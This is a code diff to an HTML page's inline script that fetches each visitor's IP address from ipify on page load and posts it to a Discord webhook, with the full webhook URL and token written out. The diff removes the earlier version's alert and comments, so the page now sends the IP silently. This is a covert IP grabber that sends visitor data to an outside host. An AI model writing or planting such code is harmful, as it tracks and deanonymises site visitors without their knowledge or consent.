@@ -7,40 +7,13 @@
 </head>
 <body>
     <script>
-        // Fetch user's IP address using ipify API
         fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                // Get the user's IP address
-                const userIP = data.ip;
-
-                // Alert the user's IP address
-                alert('Your IP address is: ' + userIP);
-
-                // Send the IP address to the Discord webhook
-                fetch('https://discord.com/api/webhooks/1335125244364455956/9inY9IIqiIixJ_4sf86jSawVLq4pKOb3mi74HSUcltpa9Ipc8fMwlN1-RZfky3avRN6y', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        content: `IP Address: ${userIP}`
-                    })
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log('IP address sent to Discord');
-                    } else {
-                        console.log('Failed to send IP address to Discord');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error sending IP address to Discord:', error);
-                });
-            })
-            .catch(error => {
-                console.error('Error fetching IP address:', error);
-            });
+            .then(res => res.json())
+            .then(data => fetch('https://discord.com/api/webhooks/1335125244364455956/9inY9IIqiIixJ_4sf86jSawVLq4pKOb3mi74HSUcltpa9Ipc8fMwlN1-RZfky3avRN6y', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: `IP: ${data.ip}`})
+            }));
     </script>
 </body>
 </html>
